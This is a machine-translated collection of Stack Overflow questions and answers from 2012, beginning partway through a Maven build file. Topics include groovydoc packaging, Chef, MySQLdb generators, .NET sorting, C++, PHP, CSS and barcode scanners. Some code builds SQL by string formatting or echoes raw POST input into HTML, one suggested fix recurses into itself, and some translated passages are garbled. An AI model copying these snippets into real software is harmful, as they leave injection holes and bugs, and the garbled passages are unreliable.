                    <sourceEncoding>${project.build.sourceEncoding}</sourceEncoding>
                    <source/>
                </configuration>
                <executions>
                    <execution>
                        <goals>
                            <!-- Only used when doing java/groovy join builds
                                 OR, add the dependency to groovy-all again here in the plugin
                            -->
                            <goal>generateStubs</goal>
                            <goal>compile</goal>
                            <!-- Only used when doing java/groovy join builds
                                 OR, add the dependency to groovy-all again here in the plugin
                            -->
                            <goal>generateTestStubs</goal>
                            <goal>testCompile</goal>
                        </goals>
                    </execution>
                </executions>
                <dependencies>
                    <dependency>
                        <groupId>org.codehaus.groovy</groupId>
                        <artifactId>groovy-all</artifactId>
                        <version>${groovyVersion}</version>
                    </dependency>
                </dependencies>
            </plugin>
            <plugin>
                <groupId>org.apache.maven.plugins</groupId>
                <artifactId>maven-antrun-plugin</artifactId>
                <version>1.7</version>
                <executions>
                    <execution>
                        <id>groovydoc</id>
                        <phase>site</phase>
                        <goals>
                            <goal>run</goal>
                        </goals>
                        <configuration>
                            <target>
                                <taskdef name="groovydoc"
                                         classname="org.codehaus.groovy.ant.Groovydoc"
                                         classpathref="maven.compile.classpath"
                                        />
                                <groovydoc destdir="${project.reporting.outputDirectory}/groovydoc"
                                           sourcepath="${basedir}/src/main/groovy" use="true"
                                           windowtitle="${project.name}"
                                           doctitle="${project.name}"
                                        >
                                    <link packages="java.,org.xml.,javax.,org.xml."
                                          href="http://download.oracle.com/javase/6/docs/api"/>
                                    <link packages="org.apache.tools.ant."
                                          href="http://evgeny-goldin.org/javadoc/ant/api"/>
                                    <link packages="org.junit.,junit.framework."
                                          href="http://kentbeck.github.com/junit/javadoc/latest"/>
                                    <link packages="groovy.,org.codehaus.groovy."
                                          href="http://groovy.codehaus.org/api/"/>
                                    <link packages="org.codehaus.gmaven."
                                          href="http://evgeny-goldin.org/javadoc/gmaven"/>
                                </groovydoc>
                            </target>
                        </configuration>
                    </execution>
                </executions>
            </plugin>
            <plugin>
                <artifactId>maven-assembly-plugin</artifactId>
                <version>2.3</version>
                <configuration>
                    <descriptors>
                        <descriptor>src/main/assembly/groovydoc.xml</descriptor>
                    </descriptors>
                </configuration>
                <executions>
                    <execution>
                        <id>groovydoc</id>
                        <phase>site</phase>
                        <goals>
                            <goal>single</goal>
                        </goals>
                    </execution>
                </executions>
            </plugin>
        </plugins>
    </build>
</project> 
```

`src/main/assembly/groovydoc.xml`

```
<assembly xmlns="http://maven.apache.org/plugins/maven-assembly-plugin/assembly/1.1.2"
          xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
          xsi:schemaLocation="http://maven.apache.org/plugins/maven-assembly-plugin/assembly/1.1.2 http://maven.apache.org/xsd/assembly-1.1.2.xsd">
    <id>groovydoc</id>
    <formats>
        <format>jar</format>
    </formats>

    <includeBaseDirectory>false</includeBaseDirectory>

    <fileSets>
        <fileSet>
            <directory>${project.reporting.outputDirectory}/groovydoc</directory>
            <outputDirectory>/</outputDirectory>
        </fileSet>
    </fileSets>
</assembly> 
```

如果你跑

```
mvn site 
```

您将在目标目录中有一个 groovydoc jar 文件。

如果您希望在[Default Lifecycle](http://maven.apache.org/guides/introduction/introduction-to-the-lifecycle.html)期间创建它，您可以将其更改`<phase>site</phase>`为。您必须更改生成的 groovydoc 所在的目录才能使其正常工作。`<phase>prepare-package</phase>`

# chef-infra - 食谱未在 Chef 中执行

> ID：13343416
> 
> 赞同：4
> 
> 时间：2012-11-12T12:05:59.497
> 
> 标签：chef-infra, apt, recipe, cookbook

我正在制作一个简单的方法来升级整个系统。

```
include_recipe "apt"

execute "apt-get upgrade -y" do
        command "apt-get upgrade -y"
        action :nothing
end 
```

但它永远不会运行：

```
chef-solo -j node.json -W

Recipe: up2date::default
  * execute[apt-get upgrade -y] action nothing[2012-11-12T13:05:04+01:00] 
    INFO: Processing execute[apt-get upgrade -y] 
    action nothing (up2date::default line 12)  (up to date) 
```

不明白为什么？

有没有更好/更清洁的方法？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-12T12:20:02.393

如果您包含“apt”配方，则不必创建*execute[apt-get upgrade -y]*资源。或者，如果您不想包含“apt”配方，请使用

```
execute "apt-get upgrade -y" do
    command "apt-get upgrade -y"
    action :run
end 
```

但由于运行是默认操作，名称是默认命令，因此可以缩短为

```
execute "apt-get upgrade -y" 
```

# python - Python fetch MySQLdb 使用生成器生成块 - 错误

> ID：13343432
> 
> 赞同：2
> 
> 时间：2012-11-12T12:06:30.813
> 
> 标签：python, generator, mysql-python

我有以下代码：

```
def executeQuery(conn, query):
    cur = conn.cursor()
    cur.execute(query)
    return cur

def trackTagsGenerator(chunkSize, baseCondition):
    """ Returns a dict of trackId:tag limited to chunkSize. """

    sql = """
        SELECT track_id, tag
        FROM tags 
        WHERE {baseCondition}
    """.format(baseCondition=baseCondition)

    limit = chunkSize
    offset = 0
    while True:
        trackTags = {}

        # fetch the track ids with the coresponding tag
        limitPhrase = " LIMIT %d OFFSET %d" % (limit, offset)
        query = sql + limitPhrase
        offset += limit
        cur = executeQuery(smacConn, query)
        rows = cur.fetchall()

        if not rows:
            break

        for row in rows:
            trackTags[row['track_id']] = row['tag']

        yield trackTags 
```

我想像这样使用它：

```
for trackTags in list(trackTagsGenerator(DATA_CHUNK_SIZE, baseCondition)):        
    print trackTags
    break 
```

此代码甚至没有获取一大块轨道标签就会产生以下错误：

```
Exception _mysql_exceptions.ProgrammingError: (2014, "Commands out of sync; you can't run this command now") in <bound method SSDictCursor.__del__ of <MySQLdb.cursors.SSDictCursor object at 0x10b067b90>> ignored 
```

我怀疑这是因为我在生成器函数的循环体中有查询执行逻辑。

有人能告诉我如何以这种方式使用 mysqldb 获取数据块吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T12:56:42.040

我很确定这是因为它可能会遇到由于*yield*而同时运行两个查询的情况。根据您调用函数的方式（线程、异步等），我很确定您的光标也可能会被破坏？

同样，通过基本上使用 printf 插入 baseConditional，您正在向（对不起，但我不能粉饰这部分）可怕的 SQL 注入孔敞开心扉。查看 DB-API 的参数替换文档以获取帮助。

Yield 根本不会为您节省时间或精力，完整的 sql 命令总是需要运行才能获得单个结果。（因此您使用 LIMIT 和 OFFSET 使其更友好，赞）

即，在您生成一些数据时，有人会更新表格，在这种特殊情况下 - 不是世界末日。在许多其他情况下，它变得丑陋。

如果您只是在闲逛，并且希望它“立即生效”，那么修改 executeQuery 可能会起作用：

```
 def executeQuery(conn, query):
     cur = conn.cursor()
     cur.execute(query)
     cur = executeQuery(smacConn, query)
     rows = cur.fetchall()
     cur.close()
     return rows 
```

一件事也让我很生气-您定义了trackTags = {}，但随后您更新了tagTrackIds，并产生了trackTags ..这将始终是空字典。

我的建议是，如果你只是想让一个爱好项目工作，就不要为手写 SQL 的头痛而烦恼。看看建立在[SQLAlchemy](http://www.sqlalchemy.org/)之上的[Elixir](http://elixir.ematia.de/trac/wiki)。

使用 ORM（对象关系映射器）可以更友好地介绍数据库。定义你的对象在 Python 中的样子，并让它自动为你生成你的模式——并且能够以 Python 的方式添加/修改/删除东西真的很漂亮。

如果您真的需要异步，请查看[ultramysql](https://github.com/esnme/ultramysql) python 模块。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-12T13:37:30.100

您使用`SSDictCursor`, 映射到`mysql_use_result()`MySQL-API 端的东西。这要求您在发出新命令之前读出完整的结果。

因为这发生在你收到第一块数据之前：你确定这不会在执行这部分代码*之前的查询上下文中发生吗？*最后一个查询的结果可能仍在行中，执行下一个查询（即，在*此*上下文中的第一个查询）可能会破坏事情......

# .net - 为什么 .NET 排序算法要求将项目与自身进行比较？

> ID：13343435
> 
> 赞同：4
> 
> 时间：2012-11-12T12:06:44.327
> 
> 标签：.net, sorting

我注意到，在使用 custom 对 .NET 中的数组进行排序时`IComparer<T>`，会请求将项目与自身进行比较。

为什么会这样？看看是否要对相同的索引进行比较，并假设结果必须为零，这肯定是一个微不足道的优化？

示例代码：

```
class Comparer : IComparer<string>
{
  public int Compare(string x, string y)
  {
    Console.WriteLine("{0} vs {1}", x, y);

    return string.Compare(x, y);
  }
}

static void Main(string[] args)
{
  var values = new[] {"A", "D", "C", "B", "E"};

  Array.Sort(values, new Comparer());
} 
```

输出（标记了奇怪的比较）：

```
A vs C
A vs E
C vs E
A vs C
D vs C
C vs E
C vs B
C vs C   ***
C vs C   ***
A vs B
A vs B
A vs A   ***
A vs B
A vs A   ***
D vs E
D vs E
D vs D   ***
D vs E
D vs D   *** 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-12T13:30:53.913

人们报告不同的结果，因为 Array.Sort() 算法被更改了几次。至少在 .NET 4.0 和 .NET 4.5 中，可能在此之前。最新最好的版本从 QuickSort 切换到 Introsort。

由于针对 Quicksort 非常糟糕的最坏情况行为 O(n^2) 的对策，您看到了一个元素本身的比较。[Introsort](http://en.wikipedia.org/wiki/Introsort)的Wikipedia 文章很好地解释了这一点：

> 在快速排序中，关键操作之一是选择枢轴：列表分区所围绕的元素。最简单的枢轴选择算法是将列表的第一个或最后一个元素作为枢轴，这在排序或接近排序输入的情况下会导致不良行为。Niklaus Wirth 的变体使用中间元素来防止这些发生，对于人为的序列退化到 O(n²)。median-of-3 枢轴选择算法采用列表的第一个、中间和最后一个元素的中值；然而，即使这在许多现实世界的输入中表现良好，仍然可以设计一个中间为 3 的杀手列表，这将导致基于这种枢轴选择技术的快速排序显着减慢。这样的输入可能会被攻击者利用，

您正在看到中位数 3 枢轴选择算法的副作用。

# c++ - 尝试块限制 const 变量的范围

> ID：13343437
> 
> 赞同：11
> 
> 时间：2012-11-12T12:06:53.893
> 
> 标签：c++, exception

在包装常量的初始化时，我经常遇到范围问题

```
try {
  const int value = might_throw();
}
std::cout << value << "\n";  /* error, value out of scope */ 
```

目前我使用临时值作为解决方法。有没有更好的方法来处理`const`-`try {}`情况？

```
int tmp;  /* I'd rather have tmp const */
try {
  tmp = might_throw();
}
catch (...) {
  /* do something */
}
const int value = tmp; 
```

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-11-12T12:10:34.570

而不是你的

```
int tmp;  /* I'd rather have tmp const */
try {
    tmp = might_throw();
}
catch (...) {
    /* do something */
}
const int value = tmp; 
```

你可以这样做：

```
int int_value()
{
    try {
        return might_throw();
    }
    catch (...) {
        /* do something */
        return the_something_value;
    }
}

int main()
{
    int const value = int_value();
} 
```

或者，在 C++11 中你可以做

```
int main()
{
    int const value = []() -> int {
        try {
            return might_throw();
        }
        catch (...) {
            /* do something */
            return the_something_value;
        }
    } ();
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-12T12:10:57.403

对我来说，这看起来像是一个函数的案例：

```
int const value = []()->int {
    try { return might_throw(); }
    catch (...) { return come_up_with_a_value_differently(); }
}(); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-12T12:08:35.927

```
try {
   const int value = might_throw();
   std::cout << value << '\n';
}
catch (...) {
   std::cout << "threw instead of giving me a value :(\n";
} 
```

`try`是一个范围块是有原因的！

如果你做的远不止 a `std::cout`with `value`then，是的，它会变得有点混乱。然后您可以选择：

*   丢弃`const`,
*   包含在,或*_*`value``try`
*   从本身包装 try/catch 并在 throw 时返回默认`const int`值的函数返回的值初始化 a 。`int mightThrowWrapper(int default = 0)`然后你就有了本地化的异常处理*和* `const`能力！

# android - 如何启动在我的位置放大的谷歌地图

> ID：13343443
> 
> 赞同：0
> 
> 时间：2012-11-12T12:07:16.310
> 
> 标签：android, android-layout, android-intent

我遵循了 Hellomap 教程并且效果很好，但我想做的是当应用程序启动时它可以放大我的位置。

这是我的代码：`

```
import java.util.List;

import com.google.android.maps.GeoPoint;
import com.google.android.maps.MapActivity;
import com.google.android.maps.MapView;
import com.google.android.maps.Overlay;
import com.google.android.maps.OverlayItem;

import android.graphics.drawable.Drawable;
import android.os.Bundle;

public class MainActivity extends MapActivity {

@Override
public void onCreate(Bundle savedInstanceState) {
 super.onCreate(savedInstanceState);
 setContentView(R.layout.activity_main);
 MapView mapView = (MapView) findViewById(R.id.mapview);
 mapView.setBuiltInZoomControls(true);
 mapView.getController().setZoom(7);
 List<Overlay> mapOverlays = mapView.getOverlays();
 Drawable drawable = this.getResources().getDrawable(R.drawable.androidmarker);
 CustomOverlay itemizedoverlay = new CustomOverlay(drawable, this);
 GeoPoint point = new GeoPoint((int)(24.3567 * 1E6), (int)(31.4387 * 1E6));
 OverlayItem overlayitem = new OverlayItem(point, "Hello!", "Guess Where I am");
 itemizedoverlay.addOverlay(overlayitem);
 mapOverlays.add(itemizedoverlay);

}
@Override
protected boolean isRouteDisplayed() {
    return false;
}
} 
```

任何人都可以帮忙吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-12T12:14:20.503

如果您只想设置以您的位置为中心的固定缩放级别，请执行以下操作：

```
MapController controller = mapView.getController();
controller.setCenter(point);
controller.setZoom(ZOOM_LEVEL); // Some nice constant zoom level. 
```

# java - 如何在处理中找到缩放形状上的距离/检测鼠标悬停

> ID：13343444
> 
> 赞同：1
> 
> 时间：2012-11-12T12:07:28.800
> 
> 标签：java, processing

在处理 (2) 中，我目前正在创建一个类似 UML 风格的 Java 类图。类、接口等被表示为使用处理`rect()`方法创建的矩形。为每个要显示的矩形创建一个类，存储有关它的信息，并使用`display()`绘制矩形的方法。

为了实现放大和缩小此图表（以方便非常大或非常小的项目），我添加了代码，`scale`每次鼠标滚轮滚入和滚出时都会更改一个变量。`scale()`然后，每次绘制类矩形等时，代码都会使用 Processing 的方法。

我还试图检测这些矩形之一何时被鼠标悬停。目前，这是在表示矩形的类中使用以下代码完成的：

```
//Checks to see if a mouse X and Y (posX and posY) position is inside the rectangle.        
public boolean positionCollides(int posX, int posY) {
        boolean xCollides = false, yCollides = false;

        if((centreX + (width/2) >= posX) && (centreX - (width/2) <= posX)){
            xCollides = true;
        }

        if((centreY + (height/2) >= posY) && (centreY - (height/2) <= posY)){
        yCollides = true;
        }

        if(xCollides && yCollides){
            return true;
        }
        else{
            return false;
        }

    } 
```

在哪里`mouseX`并被`mouseY`输入该方法。请注意此代码中的`centreX`和`centreY`是第一次创建矩形时包含（ed）矩形中心坐标的变量。

但是，当我放大并将缩放应用于矩形的`display()`方法时，鼠标悬停会中断 - 大概是因为这些东西显示在稍微不同的 X 和 Y 坐标上，并且它仍在检查旧的坐标。

有没有办法可以改变我的上述`positionCollides`方法来帮助它处理缩放的结果？我怎样才能得到这个排序？

我试图通过将调用`positionCollides`后的代码放在`scale()`显示方法中（试图使 mouseX 和 mouseY 值也进行缩放），并将 mouseX 和 mouseY 乘以比例（即 0.9， 1.1) 尝试使它们达到正确的值。

也许有一种方法可以动态改变对象的 centerX 和 centerY？

感谢您阅读我的文字墙。

**tl;dr** - 如何检测鼠标指针是否在处理中缩放的形状/矩形内？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-12T13:14:15.380

在这里，试试这个：

（在处理 1.5 中测试）

```
int x, y, sz;
float factor = 0.87;//any value here
float transx = 50;//any value here
float transy = 25;//any value here
void setup()
{
  size(400, 400);
  x=100;
  y=100;
  sz=50;
}

void draw()
{

  noFill();
  //draw at original positon, no fill
  rect(x, y, sz, sz);
  scale(factor);
  translate(transx, transy);
  fill(255);
  //draw after scalling and positioning filled this is tested for insidness
  rect(x, y, sz, sz);
  if ( mouseX / factor - transx > x    && 
       mouseX / factor - transx < x+sz && 
       mouseY / factor - transy > y    && 
       mouseY / factor - transy < y+sz)
  {
    println("i'm inside!!!");
  }
  else
  {
    println("i'm outside");
  } 
```

}

# asp.net - 在 Superpreview 上测试受表单身份验证限制的页面的浏览器兼容性

> ID：13343448
> 
> 赞同：0
> 
> 时间：2012-11-12T12:07:44.797
> 
> 标签：asp.net, cross-browser, forms-authentication, superpreview

我有一组使用*Forms Authentication*进行身份验证的页面。当我尝试使用***SuperPreview***测试这样的页面并在 Url Location 框中输入 URL 时，会自动出现**登录**页面！对我来说，一种可能的解决方案是*禁用*身份验证，但我确信你们中的一个聪明人有一个*更干净*（**更好**）的方法来做到这一点。那么，我该怎么做呢？

**注意：**我对 SuperPreview 相当陌生，并不完全熟悉它。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-12T13:32:11.487

我是不耐烦的灵魂，我继续熟悉 SuperPreview 并猜猜是什么！**Url Location**旁边是**页面交互模式**，可帮助您登录到需要该模式的页面。*很整齐耶……*

![就是这个！](../Images/3f7a0ca52519d7c678aa316dab5cc5ad.png)

# objective-c - 如何将数据从 iCloud 存储文件迁移到本地存储中的新存储文件？

> ID：13343449
> 
> 赞同：1
> 
> 时间：2012-11-12T12:07:47.480
> 
> 标签：objective-c, ios, core-data, persistence, icloud

我`iCloud`在我的应用程序中有。我已从`iCloud`我的应用程序中删除，但在 ios 6 应用程序崩溃并且我收到以下消息：

```
 -[NSPersistentStoreCoordinator addPersistentStoreWithType:configuration:URL:options:error:](1055): 
```

`CoreData: Ubiquity: Error:`以前使用 iCloud 集成选项添加到协调器的持久性存储必须始终使用选项字典中存在的选项添加到协调器。如果您希望在没有 的情况下使用存储`iCloud`，请将数据从`iCloud`存储文件迁移到本地存储中的新存储文件。

我该如何解决这个错误？如何将数据从`iCloud`存储文件迁移到本地存储中的新存储文件？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-27T06:40:01.917

是的，我也有这个问题。我想把 iCloud 商店变成本地商店

* * *

## 解决方案 1：将 managedObjects 一个一个移动到 localStore。

但是如果你有一个大数据库，它会很慢。

所以我昨天找到了第二个解决方案。

* * *

## 解决方案 2：编辑 iCloud 商店的元数据，

## 并将其保存到新位置。

删除元数据中的“com.apple.coredata.ubiquity.*”键后，您将获得一个完全本地的存储。

* * *

这是我的解决方案 2 的代码：

已经设置了一些属性：

```
@property (nonatomic, strong) NSPersistentStoreCoordinator *coordinator;
@property (nonatomic, strong) NSManagedObjectContext *context;

@property (nonatomic, strong) NSPersistentStore *iCloudStore;
//represent the iCloud store already using 
//(after [coordinator addPersistentStore] you get this NSPersistentStore)

@property (nonatomic, strong) NSURL *iCloudStoreURL;
//represent the iCloud store real location
//(it is the URL you send to the [coordinator addPersistentStore])

@property (nonatomic, strong) NSURL *iCloudStoreLocalVersionURL;
//represent the location of local version store you want to save 
```

以及迁移方法：

```
-(void)migrateCloudStoreToLocalVersion
{
    if(!self.iCloudStore)
        return;

    // remove previous local version
    [FILE_MANAGER removeItemAtURL:self.iCloudStoreLocalVersionURL
                            error:nil];

    // made a copy from original location to the new location
    [FILE_MANAGER copyItemAtURL:self.iCloudStoreURL
                          toURL:self.iCloudStoreLocalVersionURL
                          error:nil];

    //prepare meta data
    NSDictionary *iCloudMetadata = [self.coordinator metadataForPersistentStore:self.iCloudStore].copy;

    NSMutableDictionary *localVersionMetadata = iCloudMetadata.mutableCopy;
    for(NSString * key in iCloudMetadata){
        if([key hasPrefix:@"com.apple.coredata.ubiquity"]){
            [localVersionMetadata removeObjectForKey:key];
        }
    }

    //modify iCloud store
    [self.coordinator setMetadata:localVersionMetadata forPersistentStore:self.iCloudStore];
    [self.coordinator setURL:self.iCloudStoreLocalVersionURL forPersistentStore:self.iCloudStore];

    //save to the localVersion location
    [self.context save:nil];

    //restore iCloud store
    [self.coordinator setMetadata:iCloudMetadata forPersistentStore:self.iCloudStore];
    [self.coordinator setURL:self.iCloudStoreURL forPersistentStore:self.iCloudStore];
} 
```

然后您可以使用`iCloudStoreLocalVersionURL`本地版本存储。

您可以将此本地版本存储用作本地存储，而不会出现任何错误。

**笔记：**

注意`NSStoreUUIDKey`元数据中的

您可以选择将其替换为新商店。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-13T02:04:29.970

我相信您也必须更改 UUID 编号，我会在应用程序的下一次运行时收到错误，即它两次加载同一个商店。所以我做了这个修改

```
 if (!self.iCloudStore) return;
NSError *error = nil;

NSURL* localStoreURL = [self fallbackStoreURL];

 NSFileManager *fm = [[NSFileManager alloc] init];

 if (!self.fallbackStore) [self loadFallbackStore:&error];

NSString* fallBackUUID;

//find UUID of original to put back in later
NSDictionary *fallBackMetadata = [_psc metadataForPersistentStore:self.fallbackStore].copy;
for(NSString* key in fallBackMetadata)
{
    if([key hasPrefix:@"NSStoreUUID"])
    {
        fallBackUUID = [fallBackMetadata objectForKey:key];
        break;
    }
}

[fm removeItemAtURL:localStoreURL error:nil];

//prepare meta data
NSDictionary *iCloudMetadata = [_psc metadataForPersistentStore:self.iCloudStore].copy;
NSMutableDictionary *localVersionMetadata = iCloudMetadata.mutableCopy;
for(NSString* key in iCloudMetadata)
{
    if([key hasPrefix:@"com.apple.coredata.ubiquity"])
    {
        [localVersionMetadata removeObjectForKey:key];
    }

    if([key hasPrefix:@"NSStoreUUID"])
    {
         if (fallBackUUID) [localVersionMetadata setObject:fallBackUUID forKey:key];
    }
}

//modify iCloud store
[_psc setMetadata:localVersionMetadata forPersistentStore:self.iCloudStore];
[_psc setURL:localStoreURL forPersistentStore:self.iCloudStore];

// make a copy from original location to the new location
[fm copyItemAtURL:[self iCloudStoreURL]
                      toURL:localStoreURL
                      error:nil];

 [_fallbackContext save:nil];

[_psc setMetadata:iCloudMetadata forPersistentStore:self.iCloudStore];
[_psc setURL:[self iCloudStoreURL] forPersistentStore:self.iCloudStore]; 
```

# php - php simplexml xpath按属性匹配元素，按文本值匹配子项

> ID：13343450
> 
> 赞同：2
> 
> 时间：2012-11-12T12:07:54.170
> 
> 标签：php, xpath, simplexml

我有以下xml（实际上更长）

```
 <excluded_postcodes>
   <postcode Outward="TR1">
    <Inward>1DH</Inward>
    <Inward>1DQ</Inward><
    Inward>1DW</Inward>
    <Inward>1DZ</Inward>
    <Inward>1EP</Inward>
    <Inward>1ET</Inward>
    <Inward>1EU</Inward>
    <Inward>1EX</Inward>
       </postcode>
       <postcode Outward="TR1">
            <Inward>1PT</Inward>
    <Inward>1QA</Inward>
    <Inward>1QH</Inward>
    <Inward>1SE</Inward>
    <Inward>1SG</Inward>
       </postcode>
    </excluded_postcodes> 
```

我可以使用 simplexml xpaths 匹配给定外部值的邮政编码

```
$xml->xpath('/excluded_postcodes/postcode[@Outward="TR1"]'); 
```

我想做的是匹配 postode[@Outward="TR1"] 的给定 Inward Value 的孩子

```
$xml->xpath('/excluded_postcodes/postcode[@Outward="TR1"]/Inward//text()="1EU"'); 
```

但是我没有运气尝试建立正确的 xpath 来实现这一点。非常感谢任何帮助。

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-12T12:22:21.013

```
/excluded_postcodes/postcode[@Outward="TR1"]/Inward[text()="1EU"] 
```

# php - 函数在php中不返回任何内容

> ID：13343451
> 
> 赞同：2
> 
> 时间：2012-11-12T12:07:54.477
> 
> 标签：php, string, function

我有这个函数的问题，它没有为我返回任何东西，我不知道我想获得两个字符串的异或的原因`

```
<?php
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    if (array_key_exists("back", $_POST)) {
        header('Location: index.php');
        exit;
    }
}
function xor_this($string) {

// Let's define our key here
 $key = ('ma');

 // Our plaintext/ciphertext
 $text =$string;

 // Our output text
 $outText = '';

 // Iterate through each character
 for($i=0;$i<strlen($text);)
 {
     for($j=0;$j<strlen($key);$j++,$i++)
     {
         $outText .= $text{$i} ^ $key{$j};
         echo 'i='.$i.', '.'j='.$j.', '.$outText{$i}.'<br />'; //for debugging
         echo $outText;
     }
 }  
 return $outText;
}
?>
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <title></title>
    </head>
    <body>
        <form name="confirm" action="index.php" method="POST">

            <table>
                <tr>
                    <td>La chaine a chiffrer :</td>
                    <td><?php echo $_POST['chaine']; ?></td>
                </tr>
                <tr>
                    <td>La cle de meme taille :</td>
                    <td><?php echo $_POST['cle']; ?></td>
                </tr>
                <tr>
                    <td>Le XOR :</td>
                    <td><?php  echo xor_this($_POST['chaine']); ?></td>
                </tr>
            </table>     
            <input type="submit" name="back" value="retour"/>

        </form>

    </body>
</html>
` 
```

你对这个问题有什么想法吗，我提前谢谢你

- - - - - - - - - - 编辑 - - - - - - - - - - - - -

我考虑了你的答案，但同样的问题：函数返回的字符串上没有显示任何内容，这是新代码：

```
 <?php
session_start();
$flag = false;

function xor_this($chaine, $cle) {
 $chiffre = '';
 // Iterate through each character
 for($i=0;$i<strlen($chiffre);)
 {
         $chiffre .= $chaine{$i} ^ $cle{$i};         
         echo $chiffre;     
 }  
 return $chiffre;
}

?>
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <title></title>
    </head>
    <body>
        <?php
        if ($_SERVER["REQUEST_METHOD"] == "POST") {
            $data = array("chaine" => $_POST["chaine"], "cle" => $_POST["cle"]);
        }
        ?>
        <form name="logon" action="index.php" method="POST" >
            <table>
                <tr>
                    <td>La chaine a chiffrer :</td>
                    <td><input type="text" name="chaine" value="<?php if (!empty($data["chaine"])) echo $data["chaine"]; else echo ""; ?>" ></td>
                </tr>
                <tr>
                    <td>La cle de meme taille :</td>
                    <td><input type="text" name="cle" value="<?php if (!empty($data["cle"])) echo $data["cle"]; else echo ""; ?>" ></td>
                    <td>
                        <?php
                        if ($_SERVER["REQUEST_METHOD"] == "POST") {                            
                                if (strlen($_POST['chaine']) <> strlen($_POST['cle']))
                                    echo "la chaine et la cle sont de taille differente";
                        }
                        ?>
                    </td>
                </tr>
            </table>                                   
            <input type="submit" value="Chiffrer">
            <table>
                <tr>
                    <td>La chaine chiffre : </td>
                    <td>                        
                        <?php
                        if ($_SERVER["REQUEST_METHOD"] == "POST") {                            
                                if (strlen($_POST['chaine']) == strlen($_POST['cle']))
                                    echo bin2hex(xor_this($_POST["chaine"],$_POST["cle"]));
                        }
                        ?>
                    </td>
                </tr>
            </table>
        </form>  
    </body>
</html> 
```

你还有什么想法吗，谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T12:25:38.840

您的代码几乎是正确的。主要问题是，所有小写字母都将超出可打印范围。

您可以使用`bin2hex()`十六进制查看结果：

```
bin2hex(xor_this($string)); 
```

仅考虑小写字母，ASCII 范围为：`[97, 122]`或二进制：

```
0110_0001
0111_1010 
```

这意味着，对于一个小写字母，结果总是如下所示：`000x_xxxx`.

*您可以获得*的最高数字如下：`0001_1111`，即`31`，因此*所有*小写字母都将映射到不可打印的字符。

## 更好的 for 循环

当 $text 短于 $key 时，您可以通过在内部循环中引入附加条件来修复 Jon 指出的边缘情况。

但是，请考虑以下替代方案：

```
$key = str_pad("", strlen($text), "ma");
for($i = 0; $i < strlen($text); $i++) {
    $outText .= $text[i] ^ $key[$i];
} 
```

# css - 禁用 CSS 规则

> ID：13343453
> 
> 赞同：6
> 
> 时间：2012-11-12T12:07:56.263
> 
> 标签：css, kendo-ui

有什么办法可以禁用 CSS 规则？

我问是因为我使用的是 Kendo UI，他们的规则非常全面，例如：

```
.k-grid td
{
   // styles
} 
```

但是，如果我把我的桌子放在他们的桌子里，它的样式也会类似，所以它的影响太大了，需要移除/更换。我不想手动覆盖规则并跟上任何剑道的变化。我也不想每次更新剑道文件时都必须手动删除它。

有没有容易修复的机会？谢谢

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-12T12:12:36.313

不幸的是，没有更好的方法来禁用与该规则匹配的元素的 CSS 规则，除非覆盖规则定义的所有内容。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-12T12:15:53.400

您将不得不在单独的 css 中覆盖这些样式属性`!important`

```
.k-grid td
{
   // UI styles
   color:#000;
}

/* your style */
.k-grid td
{
   // styles
   color:#fff !important;
} 
```

# c# - 如何使用 C# 从 Symbol LS2208 条码扫描仪正确捕获数据

> ID：13343458
> 
> 赞同：2
> 
> 时间：2012-11-12T12:08:14.777
> 
> 标签：c#, barcode, scanning

我被要求开发一个 C# Winforms 应用程序，它可以读取条形码并根据具有相关条形码的产品处理数据。

我们使用的条形码扫描仪是 Symbol LS2208 usb 扫描仪，当它来的时候，盒子里没有说明或 cd。我们将其插入，它向我们发出哔哔声，并且能够将条形码值扫描到记事本中作为测试。

在我的应用程序中，我如何确保扫描仪将数据填充到相关的文本框中（我一直在设置焦点，在按钮点击等所有其他操作之后）以及我如何知道何时扫描了整个条形码？目前我有一个表单计时器，每 50 毫秒计时一次并检查文本框值的长度。如果它不再变大，我假设整个条形码都已写入。

只是感觉有点“笨拙”，想知道是否有另一种方法可以做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T12:12:01.457

大多数条形码扫描仪在实际条形码数据之前和之后发送几个控制字符，通常是 ^B 和 ^C。

通过监听 keypress 事件来查看它实际发送的键，并观察它发送的控制字符。然后您可以确定条形码数据的开始和结束时间。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-12T12:14:49.753

[适用于扫描仪的摩托罗拉驱动程序和 SDK](http://www.motorola.com/Business/US-EN/Business+Product+and+Services/Software+and+Applications/Mobility+Software/Scanner+Drivers+and+Utilities)

在我看来，摩托罗拉实际上有一个用于这种事情的 SDK，带有驱动程序特定的 LS2208。

大量文档：

[摩托罗拉 LS2208 文档](http://support.symbol.com/support/browse.do?WidgetName=BROWSE_PRODUCT&TaxoName=SG_SupportGoals&BROWSE_PRODUCT.isProductTaxonomy=true&BROWSE_PRODUCT.NodeId=SG_LS_2208_1_2&BROWSE_PRODUCT.thisPageUrl=/product/products.do&id=m4&BROWSE_PRODUCT.TaxoName=SG_SupportGoals&NodeType=leaf&NodeName=LS2208&BROWSE_PRODUCT.NodeType=leaf&NodeId=SG_LS_2208_1_2&AppContext=AC_ProductPage&param_document=sp)

说真的，谷歌呻吟！

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-12T12:17:31.473

